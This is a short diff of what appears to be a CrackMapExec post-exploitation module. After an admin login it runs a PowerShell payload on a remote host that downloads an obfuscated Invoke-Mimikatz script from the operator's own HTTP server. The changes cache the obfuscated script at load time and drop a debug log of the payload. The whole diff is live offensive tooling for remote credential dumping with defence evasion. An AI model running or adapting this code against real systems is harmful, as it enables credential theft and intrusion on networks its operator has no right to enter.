@@ -23,6 +23,8 @@ class CMEModule:
         '''
         '''
 
+        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')
+
     def on_admin_login(self, context, connection):
 
         '''
@@ -65,7 +67,6 @@ class CMEModule:
                                           port=context.server_port,
                                           addr=context.localip)
 
-        context.log.debug('Payload: {}'.format(payload))
         payload = create_ps_command(payload)
         connection.execute(payload)
         context.log.success('Executed payload')
@@ -75,9 +76,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read())
-                request.wfile.write(ps_script)
+            request.wfile.write(self.ps_script)
 
         else:
             request.send_response(404)
